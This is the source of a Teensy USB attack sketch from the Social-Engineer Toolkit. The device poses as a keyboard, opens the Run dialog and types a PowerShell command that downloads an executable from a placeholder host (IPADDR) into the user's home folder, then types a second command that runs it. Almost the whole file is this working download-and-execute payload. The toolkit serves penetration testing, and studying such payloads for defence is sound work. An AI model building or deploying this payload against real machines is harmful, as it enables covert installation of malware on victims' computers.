//
// Social-Engineer Toolkit Teensy Attack Vector
// Written by: Dave Kennedy (ReL1K) and Josh Kelley (WinFaNG)
//
// Special thanks to: Irongeek
//
// 2011-02-28 padzero@gmail.com
// * Added "ALT code" print functions (ascii_*): Fixed payload execution on non-english keymap targets
// * Change path from C:\ to %HOMEPATH%: Fixed payload execution on Windows 7
//

char *command1 = "powershell -Command $clnt = new-object System.Net.WebClient;$url= 'http://IPADDR/x.exe';$file = ' %HOMEPATH%\\x.exe ';$clnt.DownloadFile($url,$file);";
char *command2 = "%HOMEPATH%\\x.exe";

void setup() { 
    delay(5000);
    omg(command1);
    delay(15000);
    // run this executable
    omg(command2);
 }
  
void loop() {}

void omg(char *SomeCommand)
{
  Keyboard.set_modifier(128); 
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now(); 
  Keyboard.set_modifier(0); 
  Keyboard.set_key1(0); 
  Keyboard.send_now(); 
  delay(1500);
  Keyboard.println(SomeCommand);
}
